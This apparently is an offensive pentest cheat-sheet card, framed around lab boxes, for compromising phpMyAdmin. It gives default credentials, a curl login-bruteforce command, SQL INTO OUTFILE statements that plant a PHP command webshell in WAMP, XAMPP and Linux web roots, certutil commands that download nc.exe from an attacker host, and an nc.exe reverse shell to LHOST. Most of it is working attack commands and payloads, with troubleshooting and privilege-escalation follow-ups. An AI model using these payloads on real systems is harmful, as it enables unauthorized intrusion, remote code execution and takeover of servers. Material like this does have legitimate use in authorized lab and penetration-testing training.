title: phpMyAdmin — Default Creds + SQL INTO OUTFILE Webshell
body:
phpMyAdmin is a web-based MySQL admin panel — commonly found on internal ports behind a proxy (8080, 8888) or directly on 80/443. Default credentials work constantly on lab boxes. Once authenticated, SQL INTO OUTFILE writes PHP files directly to the web root — giving you a webshell without uploading anything.

Windows gotcha: the path in INTO OUTFILE must be the Windows web root, not /var/www/html. WAMP uses C:/wamp/www/, XAMPP uses C:/xampp/htdocs/. Use forward slashes in the SQL query — MySQL handles them on Windows.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — DEFAULT CREDS (try before anything else)
# ══════════════════════════════════════════════════
# Common default credentials:
# root : (blank)     ← most common on WAMP/XAMPP
# root : root
# root : toor
# root : mysql
# admin : admin
# pma  : (blank)

# Bruteforce via curl if manual fails:
curl -s -c cookies.txt -b cookies.txt \
  -d 'pma_username=root&pma_password=&server=1&target=index.php' \
  http://$ip:8080/phpmyadmin/index.php | grep -i 'logout\|welcome\|error'

# ══════════════════════════════════════════════════
# STEP 2 — SQL INTO OUTFILE WEBSHELL
# ══════════════════════════════════════════════════
# Navigate to: SQL tab in phpMyAdmin

# Linux web root:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

# Windows WAMP (most common on Windows lab boxes):
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/cmd.php';

# Windows XAMPP:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/cmd.php';

# Windows WAMP64:
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp64/www/cmd.php';

# If you don't know the web root — check MySQL variables:
SHOW VARIABLES LIKE 'secure_file_priv';
# empty string = write anywhere
# NULL = writes disabled (use different approach)
# /path = restricted to that path

# Find web root path from MySQL:
SELECT @@datadir;   -- gives data dir, web root is usually a sibling

# ══════════════════════════════════════════════════
# STEP 3 — CONFIRM RCE + FILE TRANSFER
# ══════════════════════════════════════════════════
# Test the webshell:
# Browser: http://$ip:8080/cmd.php?cmd=whoami
# curl:    curl "http://$ip:8080/cmd.php?cmd=whoami"

# ── URL ENCODING FOR BROWSER WEBSHELL ────────────
# When running commands in browser URL, special chars MUST be encoded:
# Space    → + or %20
# &        → %26  (& in URL ends the query param)
# >        → %3E  (redirect operator — breaks command)
# <        → %3C
# |        → %7C  (pipe)
# ;        → %3B
# "        → %22
#
# Correct certutil in browser URL (use + for spaces):
# http://$ip:8080/cmd.php?cmd=certutil+-urlcache+-f+http://KALI:8001/nc.exe+C:\wamp\www\nc.exe
#
# WRONG (angle brackets break it):
# ?cmd=certutil+-urlcache+-f+<http://KALI/nc.exe>+C:\wamp\www\nc.exe
#                             ^^^  ^^^  broken!

# ── WINDOWS FILE TRANSFER via certutil ───────────
# Host the file on Kali:
python3 -m http.server 8001

# In browser webshell (spaces as +):
# http://$ip:8080/cmd.php?cmd=certutil+-urlcache+-f+http://LHOST:8001/nc.exe+C:\wamp\www\nc.exe

# Or via curl on Kali (to confirm syntax first):
curl "http://$ip:8080/cmd.php?cmd=certutil+-urlcache+-f+http://$lhost:8001/nc.exe+C:\\wamp\\www\\nc.exe"

# ── REVERSE SHELL via nc.exe ──────────────────────
# After nc.exe is uploaded:
# http://$ip:8080/cmd.php?cmd=C:\wamp\www\nc.exe+-e+cmd.exe+LHOST+6666
# nc -nlvp 6666 on Kali

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# 'no such file or directory' on INTO OUTFILE:
#   → Wrong web root path — try WAMP, XAMPP, WAMP64 variants
#   → Check: SELECT @@global.secure_file_priv;
#   → Try: SHOW VARIABLES LIKE '%secure%';

# File written but 404 on cmd.php:
#   → Web root mismatch — file went somewhere else
#   → Try browsing to http://$ip:8080/ to find the actual root

# 'Access denied for user root' on INTO OUTFILE:
#   → secure_file_priv = NULL — writes disabled
#   → Alternative: look for writable dirs with SELECT INTO DUMPFILE
#   → Or: use phpMyAdmin's Export feature to write SQL files

# Linux reverse shell not catching:
#   → Windows target! Can't use bash -i, need nc.exe or PowerShell
#   → See certutil + nc.exe steps above
warn: Windows paths in SQL INTO OUTFILE must use forward slashes or escaped backslashes — C:/wamp/www/cmd.php works, C:\wamp\www\cmd.php may error. When running commands through a browser webshell, NEVER use angle brackets (<>) around URLs — %3C and %3E are the encoded forms but certutil doesn't use them at all. Use plain spaces (as + or %20) between arguments. The & character in cmd output will terminate your URL query string — use curl instead of browser for commands with output containing &.

choices.label: Got RCE on Windows — transfer nc.exe and get shell
Got shell — check whoami /priv for SeImpersonate
Got shell on Linux — upgrade and enum
secure_file_priv blocked writes — try other vectors
